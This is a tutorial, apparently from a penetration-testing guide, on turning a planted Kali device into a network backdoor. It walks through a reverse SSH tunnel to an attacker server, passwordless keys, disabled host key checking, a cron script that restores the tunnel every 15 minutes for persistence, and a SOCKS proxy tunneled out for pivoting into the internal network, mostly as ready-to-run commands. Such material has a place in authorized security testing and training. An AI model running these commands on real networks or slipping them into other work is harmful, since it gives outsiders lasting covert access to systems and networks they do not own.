
# SSH tunneling

It is required that the SSH server starts at boot time, so add one line to the /etc/rc.local file:

```
sudo /etc/init.d/ssh start
```

Some idiosyncrasies worth noting:

Instead of using /etc/init.d/ssh start, it's more common and recommended to use **sudo service ssh start** on many modern Linux distributions. This command ensures that the SSH service starts at boot time.

The /etc/rc.local file is used for running commands at the end of the system boot process on older Linux systems. However, on some newer distributions, /etc/rc.local might not exist or may not be executable by default. In such cases, an alternative method or systemd service file may be required.

Anyway, once we learn the backdoor’s IP address, we can connect to it using the ssh command:

```
ssh root@192.168.1.2
```

Do not forget to change the password, and also the hostname:

```
root@kali:~ $ passwd
Changing password for root
(current) UNIX password:
Enter new UNIX password:
root@kali:~ $ echo 'backdoor' > /etc/hostname
root@kali:~ $ reboot
```

SSH can build a tunnel linking two ports on two machines:

```
root@backdoor:~ # ssh -nNT -R 5555:localhost:22 <AttackServer_IP>
root@<AttackServer>’s password:
```

The options -nNT in the SSH command serve specific purposes in different scenarios:

-n: Redirects stdin from /dev/null

This option prevents SSH from reading input from the terminal. It's useful when you want to run SSH in a script or a background process where you don't need or want interactive input.

-N: Specifies no remote command execution.

Using -N tells SSH not to execute any remote commands after the connection is established. This is commonly used when you're only interested in setting up port forwarding or tunneling without opening a shell session or running any commands on the remote server.

-T: Disables pseudo-terminal allocation.

-T is used to disable pseudo-terminal allocation, meaning no interactive shell is allocated on the remote end. This is helpful when you're setting up a tunnel or forwarding ports and don't need or want an interactive shell session on the remote server.

In order to SSH into our backdoor, we simply connect to the attack server on port 5555:

```
root@AttackServer:~ # ssh localhost:5555
```

However, we need to automate this connection without the need to enter the password on the backdoor each time. Generating a public/private key pair is how we might achieve that.

```
root@backdoor:~ # ssh-keygen -t rsa -b 2048
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
```

Here is the next step:

```
root@AttackServer:~ # scp 192.168.1.2:/root/.ssh/id_rsa.pub
./id_pi.pub
root@AttackServer:~ # mkdir /root/.ssh
root@AttackServer:~ # cat id_pi.pub >> /root/.ssh/authorized_keys
```

SCP Command:

This command copies the id_rsa.pub file from the /root/.ssh/ directory on 192.168.1.2 to the current directory (./id_pi.pub) on AttackServer. Ensure that 192.168.1.2 is the correct IP address and that you have appropriate permissions to access /root/.ssh/id_rsa.pub on that server.

Create SSH Directory:

This command creates a new .ssh directory in the /root directory of AttackServer. This directory is typically used for storing SSH configuration and key files. Make sure to set appropriate permissions (chmod 700 /root/.ssh) to ensure only the root user can read from and write to this directory.

Add Public Key to Authorized Keys:

This command appends the contents of id_pi.pub (the public key) to the authorized_keys file in /root/.ssh. This allows the corresponding private key (id_rsa) from 192.168.1.2 to authenticate securely to AttackServer. Ensure that authorized_keys has secure permissions (chmod 600 /root/.ssh/authorized_keys) to prevent unauthorized access.

Normally, SSH checks the host keys of remote servers to verify their identity and prevent man-in-the-middle attacks. Setting StrictHostKeyChecking=no bypasses this check, which can be useful in automated or scripted environments where accepting the host key manually is not feasible:

```
ssh -nNT -o StrictHostKeyChecking=no -R 5555:localhost:22 <AttackServer_IP>
```

For testing purposes, we could issue our command again and check if the password prompt is still there:

```
root@backdoor:~ # ssh -nNT -R 5555:localhost:22 <AttackServer_IP>
```

The final step would be setting up a failsafe script executing every 15 minutes using a crontab task:

```
#!/bin/bash
if [[ $(ps -ef | grep -c 5555) -eq 1 ]]; then
/usr/bin/ssh -i /root/.ssh/id_rsa -nNT -R
5555:localhost:<AttackServer_PORT> <AttackServer_IP>
fi
```

A quick breakdown of the script:

**if [[ $(ps -ef | grep -c 5555) -eq 1 ]]; then:**

[[ ... ]]: Double brackets [[ ... ]] are used for conditional expressions in Bash. They are more flexible and offer additional features compared to single brackets [ ... ]. Also supports pattern matching (==, !=), regex matching (=~), and logical operators (&&, ||).

**$(ps -ef | grep -c 5555):**

Command substitution ($(...)) runs the command inside and replaces it with its output.

**ps -ef:**

Lists all processes.

**grep -c 5555:**

Counts the occurrences of 5555 in the process list.

**-eq 1:**

Checks if the count of processes running on port 5555 is equal to 1.

**then:**

Begins the block of commands to execute if the preceding if condition ([[ ... ]]) evaluates to true (0).

**/usr/bin/ssh -i /root/.ssh/id_rsa -nNT -R 5555:localhost:<AttackServer_PORT> <AttackServer_IP>:**

**/usr/bin/ssh:**

Executes the SSH command.

**-i /root/.ssh/id_rsa:**

Specifies the identity file (private key) to use for authentication.

**-nNT: SSH options:**

-n: Redirects stdin from /dev/null.
-N: Specifies no remote command execution after the connection is established.
-T: Disables pseudo-terminal allocation.

**-R 5555:localhost:<AttackServer_PORT> <AttackServer_IP>:**

Sets up a reverse SSH tunnel from port 5555 on <AttackServer_IP> to localhost on port <AttackServer_PORT>.

**fi:**

Ends the if statement block.

And finally, the crontab:

```
root@backdoor:~ # crontab -e
*/15 * * * * /bin/bash /root/reload.sh
```

**crontab -e**

This command opens the crontab file for editing using the default text editor.
The crontab file is where scheduled tasks (cron jobs) are defined for the current user.

**/15 * * * * /bin/bash /root/reload.sh**

This is the schedule part of the cron job, specifying when the command should run.

*/15: Every 15 minutes. The */15 means "every 15th minute," so it runs at 0, 15, 30, and 45 minutes past each hour. The remaining asterisks (*) represent "every hour," "every day of the month," "every month," and "every day of the week," respectively.

**/bin/bash /root/reload.sh**

/bin/bash: Specifies the shell to use for executing the script.

/root/reload.sh: The path to the script that will be executed

Ensure that /root/reload.sh has the appropriate permissions to be executed:

```
chmod +x /root/reload.sh
```

**Explanation of Cron Syntax:**

- Minute (*/15): Specifies that the command should run every 15 minutes.
- Hour (*): Every hour.
- Day of the month (*): Every day of the month.
- Month (*): Every month.
- Day of the week (*): Every day of the week.

## SSH tunneling with SOCKS proxy

If Nmap shows a local webpage running on port 80, it might be challenging to access it directly through our backdoor. One way to handle this is by setting up a SOCKS proxy using the following script:

```
root@backdoor:~# wget https://github.com/k3idii/python-socks-server
root@backdoor:~# cd python-socks-server
root@backdoor:~/python-socks-server# python server-basic.py &
2020-03-28 10:10 [INFO] Will listen on [127.0.0.1:9876]
```

The Python SOCKS server script (server-basic.py) is being started in the background (&), which means it will run independently of the terminal session. It listens on localhost (127.0.0.1) port 9876 for SOCKS proxy connections. Ensure that you have Python installed and any dependencies required by the script are satisfied before running it.

In order to make this reachable from the outside, we need to utilize SSH tunneling again.

By running the command **ssh -nNT -R 7777:localhost:9876 <AttackServer_IP>** on the backdoor, port 7777 is opened on the AttackServer and connected to port 9876 on the backdoor. This configuration allows the SOCKS program on the backdoor to forward packets to any target of our choice.

Don't forget to adjust Firefox to use this tunnel (SOCKS host: 127.0.0.1, SOCKSv5, port 7777).
